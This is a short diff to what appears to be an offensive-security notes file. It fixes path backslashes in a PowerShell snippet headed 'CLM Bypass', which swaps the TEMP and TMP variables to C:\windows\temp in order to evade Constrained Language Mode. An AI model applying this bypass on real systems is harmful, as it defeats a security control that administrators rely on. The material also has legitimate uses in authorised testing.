@@ -14,14 +14,14 @@ If you get a 200 back you're all good.
 
 # CLM Bypass   
 	#Path to Powershell
-	$CMDLine = "$PSHOMEpowershell.exe"
+	$CMDLine = "$PSHOME\powershell.exe"
 
 	#Getting existing env vars
 	[String[]] $EnvVarsExceptTemp = Get-ChildItem Env:* -Exclude "TEMP","TMP"| % { "$($_.Name)=$($_.Value)" }
 
 	#Custom TEMP and TMP
-	$TEMPBypassPath = "Temp=C:windowstemp"
-	$TMPBypassPath = "TMP=C:windowstemp"
+	$TEMPBypassPath = "Temp=C:\windows\temp"
+	$TMPBypassPath = "TMP=C:\windows\temp"
 
 	#Add the to the list of vars
 	$EnvVarsExceptTemp += $TEMPBypassPath
